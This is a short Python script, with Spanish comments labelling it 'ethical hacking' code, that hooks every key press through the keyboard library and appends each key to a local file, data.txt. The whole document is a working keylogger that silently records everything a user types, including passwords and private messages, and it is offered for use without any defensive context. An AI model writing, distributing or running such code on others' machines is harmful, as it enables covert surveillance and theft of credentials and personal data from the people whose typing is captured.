# CODIGO DE HACING ETICO SABER TODAS LAS TECLAS QUE PRECIONA Y SABER QUE ES LO QUE HA ESCRITO EL USUARIO
# pip install keyboard

import keyboard

def pressedkeys(key):
    
    with open('data.txt', 'a') as file:
        
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedkeys)
keyboard.wait()

